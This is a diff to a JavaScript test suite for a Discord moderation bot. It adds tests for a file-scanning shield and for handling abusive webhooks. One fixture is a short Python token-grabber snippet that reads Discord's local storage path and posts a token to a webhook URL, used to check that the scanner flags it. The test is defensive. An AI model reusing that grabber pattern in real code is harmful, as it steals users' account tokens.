@@ -213,7 +213,7 @@ const CHANNEL = '555555555555555555';
 
     // 7. Textos: mesmas chaves e marcadores em pt e en; todo motivo tem texto.
     const flat = (o, p = '') => Object.entries(o).flatMap(([k, v]) => (typeof v === 'object' ? flat(v, `${p}${k}.`) : [[`${p}${k}`, v]]));
-    for (const ns of ['linkShield', 'serverGuard', 'securityAlerts', 'antiRaid', 'appeals']) {
+    for (const ns of ['linkShield', 'serverGuard', 'securityAlerts', 'antiRaid', 'appeals', 'fileShield']) {
       const pt = Object.fromEntries(flat(TRANSLATIONS.pt[ns]));
       const en = Object.fromEntries(flat(TRANSLATIONS.en[ns]));
       assert.deepEqual(Object.keys(en).sort(), Object.keys(pt).sort(), `${ns}: mesmas chaves`);
@@ -369,6 +369,59 @@ const CHANNEL = '555555555555555555';
     assert.equal(await require('../src/services/profileCardGenerator').generateProfileCard({ targetUser: { id: '1' } }), null, 'Sob pressão o perfil sai sem imagem');
     mg.reset();
     console.log('  ✅ 11. Disjuntor de memória com folga e caches esvaziados.');
+
+    // 12. Escudo de arquivos e webhook vazado.
+    const ft = require('../src/services/fileThreats');
+    const grabber = 'p = os.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb"\nrequests.post("https://discord.com/api/webhooks/1/abc", json={"t": tok})';
+    assert.equal(ft.scanText(grabber), 'grabber');
+    assert.equal(ft.scanText('requests.post("https://discord.com/api/webhooks/1/abc", json={"content": "deploy ok"})'), null, 'Script comum com webhook passa');
+    assert.equal(ft.triage({ name: 'nitro.EXE' }), 'exec');
+    assert.equal(ft.triage({ name: 'grande.py', size: 900000 }), null, 'Arquivo grande nem é baixado');
+    const fileShield = require('../src/modules/file-shield');
+    guard.resetMemory();
+    out.channel.length = 0;
+    out.dms.length = 0;
+    const fetchImpl = async () => ({ ok: true, arrayBuffer: async () => Buffer.from(grabber) });
+    const fmsg = (name) => ({ ...msg(''), attachments: new Map([['1', { name, size: 200, url: 'https://cdn/x' }]]) });
+    const fr = await fileShield.onMessage(fmsg('steal.py'), client, { fetchImpl });
+    assert.equal(fr.hit.reason, 'grabber');
+    assert.equal(fr.deleted, true);
+    assert.match(out.dms[0].content, /senha/);
+    assert.equal(await fileShield.onMessage(fmsg('foto.png'), client, { fetchImpl }), null, 'Imagem não é baixada');
+    safety.saveConfig(G, { fileShield: { blockExecutables: false } });
+    assert.equal(await fileShield.onMessage(fmsg('jogo.exe'), client, { fetchImpl }), null, 'Executável liberado quando o servidor quer');
+    safety.saveConfig(G, { fileShield: { blockExecutables: true } });
+
+    guard.resetMemory();
+    out.staff.length = 0;
+    let hookDeleted = false;
+    const hookObj = { id: '888000000000000001', name: 'Avisos', type: 1, owner: { id: '555000000000000000' }, delete: async () => (hookDeleted = true) };
+    const wmsg = (extra) => ({
+      guild: { ...guild, ...auditFor(null) },
+      webhookId: hookObj.id,
+      content: '',
+      deletable: true,
+      delete: async () => {},
+      author: { username: 'Avisos' },
+      mentions: { everyone: false, users: { size: 0 } },
+      channel: { id: CHANNEL, fetchWebhooks: async () => new Map([[hookObj.id, hookObj]]) },
+      ...extra,
+    });
+    assert.equal(await serverGuard.onWebhookMessage(wmsg({ content: 'bom dia' }), client), null, 'Webhook normal passa');
+    const w1 = await serverGuard.onWebhookMessage(wmsg({ mentions: { everyone: true, users: { size: 0 } } }), client);
+    assert.deepEqual(w1, { reason: 'everyone', removed: false }, 'Modo alerta: avisa e não apaga o webhook');
+    assert.equal(out.staff[0].components[0].components[0].data.custom_id, `sg:hook:${G}:${hookObj.id}`);
+    guard.resetMemory();
+    assert.equal(await serverGuard.onWebhookMessage(wmsg({ applicationId: hookObj.id, mentions: { everyone: true, users: { size: 0 } } }), client), null, 'Resposta de comando de bot é ignorada');
+    guard.resetMemory();
+    const own = { ...hookObj, owner: { id: client.user.id } };
+    assert.equal(await serverGuard.onWebhookMessage(wmsg({ mentions: { everyone: true, users: { size: 0 } }, channel: { id: CHANNEL, fetchWebhooks: async () => new Map([[own.id, own]]) } }), client), null, 'Webhook da própria Pyxie é ignorado');
+    const hclient = { ...client, guilds: { cache: new Map([[G, { ...guild, fetchWebhooks: async () => new Map([[hookObj.id, hookObj]]), members: { fetch: async (id) => ({ permissions: { has: (f) => id === '333333333333333333' && f === PermissionFlagsBits.ManageWebhooks } }) } }]]) } };
+    const hupdates = [];
+    await serverGuard.handleInteraction({ isButton: () => true, customId: `sg:hook:${G}:${hookObj.id}`, user: { id: '333333333333333333', tag: 'x' }, reply: async () => {}, update: async (p) => hupdates.push(p) }, hclient);
+    assert.equal(hookDeleted, true, 'Gerenciar Webhooks basta para apagar o webhook');
+    assert.deepEqual(hupdates[0].components, []);
+    console.log('  ✅ 12. Escudo de arquivos e webhook vazado.');
 
     console.log('🎉 Escudo de links e guardião do servidor validados!');
   } finally {
